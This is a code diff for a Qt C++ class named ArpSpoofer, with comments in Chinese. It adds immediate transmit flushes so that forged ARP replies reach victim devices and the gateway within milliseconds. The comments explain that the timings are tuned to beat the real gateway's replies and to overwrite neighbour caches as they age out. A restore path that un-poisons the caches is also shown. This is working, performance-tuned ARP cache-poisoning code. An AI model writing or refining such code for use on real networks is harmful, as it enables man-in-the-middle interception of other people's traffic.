@@ -128,12 +128,24 @@ bool ArpSpoofer::answerGatewayArp(const QByteArray &frame)
     m_endpoint->send(reply);
     m_endpoint->send(reply);
     QTimer::singleShot(kAnswerBurstDelay1Ms, this, [this, reply, senderMac] {
-        if (m_endpoint && hasVictimMac(senderMac))
+        if (m_endpoint && hasVictimMac(senderMac)) {
             m_endpoint->send(reply);
+            // ★ 立刻收口：帧进了批量发送队列要等下一个 flushTx 点才真出网卡，而这条抢答路径的
+            //   全部意义就是「抢在真网关的应答之前当最后写入者」，那是毫秒级的竞争。延迟帧由
+            //   singleShot 从定时器回调进来，不在收帧排空里，漏掉这句就要等泵那一拍（最多 25ms），
+            //   5ms/18ms 这两发精心挑的补帧就白设计了。
+            m_endpoint->flushTx();
+        }
     });
     QTimer::singleShot(kAnswerBurstDelay2Ms, this, [this, reply, senderMac] {
-        if (m_endpoint && hasVictimMac(senderMac))
+        if (m_endpoint && hasVictimMac(senderMac)) {
             m_endpoint->send(reply);
+            // ★ 立刻收口：帧进了批量发送队列要等下一个 flushTx 点才真出网卡，而这条抢答路径的
+            //   全部意义就是「抢在真网关的应答之前当最后写入者」，那是毫秒级的竞争。延迟帧由
+            //   singleShot 从定时器回调进来，不在收帧排空里，漏掉这句就要等泵那一拍（最多 25ms），
+            //   5ms/18ms 这两发精心挑的补帧就白设计了。
+            m_endpoint->flushTx();
+        }
     });
     return true;
 }
@@ -227,6 +239,10 @@ void ArpSpoofer::sendSpoof(const Target &t)
     m_endpoint->send(replyToVictim);
     m_endpoint->send(requestToVictim);
     m_endpoint->send(replyToGateway);
+    // 收口：本函数由 1s 周期 tick 和 50ms boost 两个定时器回调驱动，都不在收帧排空路径上。
+    // boost 存在的意义是「设备邻居缓存刚老化、正在重新解析时抢在真网关前面」——再压 25ms
+    // 就正好错过那个窗口。
+    m_endpoint->flushTx();
 }
 
 QVector<QByteArray> ArpSpoofer::healFrames(const QString &victimMac, const QString &victimIp) const
@@ -275,6 +291,10 @@ void ArpSpoofer::healOne(const QByteArray &victimMac, const QByteArray &victimIp
     for (int i = 0; i < kHealRepeat; ++i)
         for (const QByteArray &f : frames)
             m_endpoint->send(f);
+    // ★ 还原帧**必须**立刻出网卡：这条路径跑在「撤劫持 / 退出 / 睡眠」上，攒在队列里等下一个
+    //   flushTx 点是赌运气 —— 端点随后就可能被 close()/析构。漏发一次的代价是被代理设备的 ARP
+    //   一直指着本机，彻底断网直到缓存老化。
+    m_endpoint->flushTx();
 }
 
 QByteArray ArpSpoofer::macToBytes(const QString &mac)
